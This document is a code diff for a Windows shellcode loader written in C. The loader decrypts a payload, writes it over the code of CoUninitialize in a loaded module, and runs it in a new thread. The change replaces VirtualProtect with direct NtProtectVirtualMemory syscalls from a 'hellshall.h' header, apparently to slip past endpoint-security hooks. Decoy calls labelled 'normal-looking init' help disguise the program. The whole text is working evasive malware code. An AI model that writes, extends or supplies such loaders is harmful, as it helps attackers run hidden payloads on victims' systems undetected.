@@ -21,6 +21,7 @@
 #include <bcrypt.h>
 #include "payload_key.h"  /* payload_key[], payload_key_len,
                               payload_iv[],  payload_iv_len  */
+#include "hellshall.h"
 
 typedef void (*pico_fn)(void *);
 
@@ -128,6 +129,8 @@ int WINAPI WinMain(HINSTANCE hi, HINSTANCE hp, LPSTR lp, int ns)
 
     noise();
 
+    if (!FetchNtProtectSyscall()) return 1;
+
     /* Registry touch: advapi32 import, normal-looking init */
     HKEY hk = NULL;
     RegOpenKeyExW(HKEY_LOCAL_MACHINE,
@@ -159,15 +162,22 @@ int WINAPI WinMain(HINSTANCE hi, HINSTANCE hp, LPSTR lp, int ns)
     void *slot = (void *)GetProcAddress(mod, "CoUninitialize");
     if (!slot) { LocalFree(pt); return 1; }
 
-    DWORD old;
-    if (!VirtualProtect(slot, pt_len, PAGE_READWRITE, &old)) {
+    DWORD  old;
+    PVOID  nt_base = slot;
+    SIZE_T nt_size = pt_len;
+    if (HhNtProtectVirtualMemory((HANDLE)-1, &nt_base, &nt_size,
+                                 PAGE_READWRITE, &old)) {
         LocalFree(pt); return 1;
     }
     memcpy(slot, pt, pt_len);
     SecureZeroMemory(pt, pt_len);
     LocalFree(pt);
 
-    if (!VirtualProtect(slot, pt_len, PAGE_EXECUTE_READ, &old)) return 1;
+    nt_base = slot;
+    nt_size = pt_len;
+    if (HhNtProtectVirtualMemory((HANDLE)-1, &nt_base, &nt_size,
+                                 PAGE_EXECUTE_READ, &old))
+        return 1;
 
     HANDLE h = CreateThread(NULL, 0, worker, slot, 0, NULL);
     if (!h) return 1;
